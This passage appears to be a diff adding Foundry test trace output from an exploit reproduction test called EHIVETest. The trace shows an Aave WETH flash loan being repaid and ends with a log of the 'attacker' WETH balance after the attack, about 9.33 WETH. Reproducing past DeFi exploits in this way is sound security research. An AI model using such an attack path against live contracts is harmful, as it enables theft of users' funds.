+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [7468] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::scaledTotalSupply() [staticcall]
+    │   │   │   │   ├─ [2419] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::scaledTotalSupply() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000002374f5eee16c98fa0075
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000002374f5eee16c98fa0075
+    │   │   │   ├─ [9982] 0x102633152313C81cD80419b6EcF66d14Ad68949A::getSupplyData() [staticcall]
+    │   │   │   │   ├─ [4921] 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57::getSupplyData() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [4841] 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8::totalSupply() [staticcall]
+    │   │   │   │   ├─ [4324] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::totalSupply() [delegatecall]
+    │   │   │   │   │   ├─ [1359] AaveFlashloan::getReserveNormalizedIncome(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   │   ├─ [807] 0xF1Cd4193bbc1aD4a23E833170f49d60f3D35a621::getReserveNormalizedIncome(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003442ba84fb6b4b9765cc103
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003442ba84fb6b4b9765cc103
+    │   │   │   │   │   └─ ← [Return] 306175101066550005526252 [3.061e23]
+    │   │   │   │   └─ ← [Return] 306175101066550005526252 [3.061e23]
+    │   │   │   ├─ [5160] 0x53F57eAAD604307889D87b747Fc67ea9DE430B01::calculateInterestRates((0, 18009000000000000000 [1.8e19], 0, 0, 171050256184647618372758 [1.71e23], 0, 1500, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8)) [staticcall]
+    │   │   │   │   ├─ [534] WETH::balanceOf(0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 135213265731625634550538 [1.352e23]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000e57d3cfab5c333a37e0440000000000000000000000000000000000000000004f58a20f326a07398be1820000000000000000000000000000000000000000001e37006cee2fa52011afd4
+    │   │   │   ├─ emit ReserveDataUpdated(param0: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param1: 17339714585769582253301828 [1.733e25], param2: 95923697467642413195190658 [9.592e25], param3: 36527512594260292535431124 [3.652e25], param4: 1010868181445883174415465054 [1.01e27], param5: 1021559230967382120389166010 [1.021e27])
+    │   │   │   ├─ [3425] WETH::transferFrom(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, 18009000000000000000 [1.8e19])
+    │   │   │   │   ├─ emit Transfer(from: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, value: 18009000000000000000 [1.8e19])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1136] 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8::handleRepayment(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18009000000000000000 [1.8e19])
+    │   │   │   │   ├─ [578] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::handleRepayment(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18009000000000000000 [1.8e19]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ emit FlashLoan(param0: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param2: 0x0000000000000000000000000000000000000000, param3: 728815563385977040452943777879061427756277306518 [7.288e47], param4: 18000000000000000000 [1.8e19], param5: 0, param6: 9000000000000000 [9e15])
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [534] WETH::balanceOf(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 9325768301100185740 [9.325e18]
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker WETH balance after attack", val: 9325768301100185740 [9.325e18], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.04s (5.73s CPU time)
+
+Ran 2 test suites in 6.28s (6.31s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
